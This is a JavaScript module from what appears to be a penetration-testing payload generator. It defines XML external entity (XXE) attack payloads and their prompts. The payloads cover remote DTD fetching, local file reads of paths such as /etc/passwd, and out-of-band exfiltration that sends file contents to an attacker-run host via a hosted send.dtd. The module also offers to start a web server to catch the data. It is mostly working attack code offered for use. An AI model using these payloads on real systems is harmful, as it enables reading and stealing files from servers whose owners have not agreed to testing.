var prompt = require('prompt');
var log = require('cli-color');
var options = log.yellow
var yellow = log.yellow
var blue = log.cyan
var black = log.blackBright
var green = log.green
var red = log.red
var M = require('mstring')

var web = require("../modules/webserver.js")

// Payload Array
arrayInjection = []

var Load = function(obj){
	arrayInjection.push(obj)
}

/* 
###########################################
############### Payloads ##################
###########################################


---[Payload Parameters]---

Required: title, payload, and category
Optional: callback (used for prompt variable)


---[Variable Formatting]---

* If variables aren't added properly, they will not work
* Variables can include instructions if needed.
* Instructions should be kept in parenthesis
	
	ex: foobar <RHOST> <LHOST> <LPORT>
	ex: foobar <RHOST (hostname)> <RPORT>	 


*/
// ########## XXE Attacks


Load({
	title: "Remote DTD File Parsing",
	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo PUBLIC 'bar' 'http://<LHOST>:<LPORT>'>",
	category: "XML",
	callback: function(returnToPrepare){
		prompt.message = "Should I fire up a web server for you? (Y/n)"

		prompt.get([{name: '_', description: ':'}], function(err, result){
			result._ = result._.toUpperCase()
			if (result._ === "Y"){
				var server = web.init(returnToPrepare)
			}
			else {
				returnToPrepare(result._)
			}
			
		})
	}
})


Load({
	title: "XXE (Local File Read)",
	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY bar SYSTEM \"file://$$PROMPT$$\"> ]]>&bar;",
	sample: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\t<!DOCTYPE foo [ <!ENTITY bar SYSTEM \"file://<remote file path>\"> ]]&bar;>",
	category: "XML",
	callback: function(returnToPrepare){
		prompt.message = "Specify a local file (/etc/passwd , C:\\Windows\\win.ini) :"
		prompt.get([{name: '_', description: ':'}], function(err, result){
			returnToPrepare(result._)
		})
	}
})

Load({
	title: "XXE (Local File Exfiltration using parameter entities)",
	// description: "-"+options(" LHOST=<lhost>, LPORT=<lport>, PROMPT=<remote file path>")+log.blackBright("\nLocally hosted send.dtd should contain the following: <!ENTITY % all \"<!ENTITY &#x25; send SYSTEM 'http://<lhost>:<lport>/?%file;'>\"> %all;"),
	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file://$$PROMPT$$\"><!ENTITY % dtd SYSTEM \"http://$$LHOST$$:$$LPORT$$/send.dtd\">%dtd;%send; ]]>",
	sample: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\t<!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file://<remote file path>\"><!ENTITY % dtd SYSTEM \"http://<lhost>:<lport>/send.dtd\">%dtd;%send; ]]>",
	category: "XML",
	callback: function(returnToPrepare){
		prompt.message = "Specify a local file (/etc/passwd , C:\\Windows\\win.ini) :"
		prompt.get([{name: '_', description: ':'}], function(err, result){
			returnToPrepare(result._)
		})
	}
})



var unique = []
var uniqueCategories = []

module.exports = {
	values: arrayInjection,
	getAll: function(value){
		tempArray = []
		for(i=0;i<arrayInjection.length;i++){
			if (arrayInjection[i].category === value){
				tempArray.push(arrayInjection[i])
			}
		}
		return tempArray
	},
	getCategories: function(){
		for (i=0;i<arrayInjection.length;i++){
			if(unique[arrayInjection[i].category]){

			}
			else {
				unique[arrayInjection[i].category] = true;
				uniqueCategories.push(arrayInjection[i].category)
			} 
		return uniqueCategories
		}
	}
}